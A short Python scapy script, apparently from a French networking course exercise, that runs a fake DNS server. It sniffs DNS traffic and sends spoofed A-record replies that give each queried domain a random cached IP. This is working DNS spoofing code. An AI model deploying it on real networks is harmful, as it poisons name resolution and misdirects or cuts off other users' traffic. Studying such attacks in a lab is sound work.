from scapy.all import *

cache = {}

class FakeDnsSrv(AnsweringMachine):
    #def __init__(self, *args, **kwargs): super(FakeDnsSrv, self).__init__(*args, **kwargs)

    filter = "udp port 53"

    def parse_options(self):
        self.cache = {}

    def is_request(self, pkt):
        if DNSQR not in pkt:
            return False
        if IP not in pkt:
            return False
        #Check if it's a A request
        if pkt[DNSQR].qtype != 1:
            return
        return True
    
    # même fonction que dans le fichier dns_menteur_correction.py
    def make_reply(self, pkt):
        if DNSQR not in pkt:
            return
        query = pkt[DNSQR]
        #Check if it's a A request
        if query.qtype != 1:
            return
        # Cache handling
        target_dom = query.qname
        reply_ip = cache.setdefault(target_dom, str(RandIP()))

        pkt_reply = IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP (
            dport = pkt[UDP].sport, sport = pkt[UDP].dport
        ) / DNS (
            id=pkt[DNS].id,
            qr=1, # on dit que y'a au moins une réponse
            qd=pkt[DNSQR],
            an=DNSRR(
                rrname=target_dom,
                type="A",
                rdata=reply_ip
            )
        )
        send(pkt_reply)
    
FakeDnsSrv()()